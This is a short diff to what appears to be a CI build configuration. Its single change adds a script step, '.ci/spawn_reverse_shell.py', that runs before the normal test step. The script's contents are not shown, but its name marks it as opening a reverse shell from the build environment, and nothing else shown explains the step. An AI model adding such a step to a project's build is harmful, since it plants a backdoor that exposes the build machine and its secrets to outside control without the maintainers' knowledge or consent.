@@ -21,6 +21,7 @@ install:
 - .ci/${MODE}_install.py
 
 script:
+- .ci/spawn_reverse_shell.py
 - .ci/${MODE}_tests.py
 
 
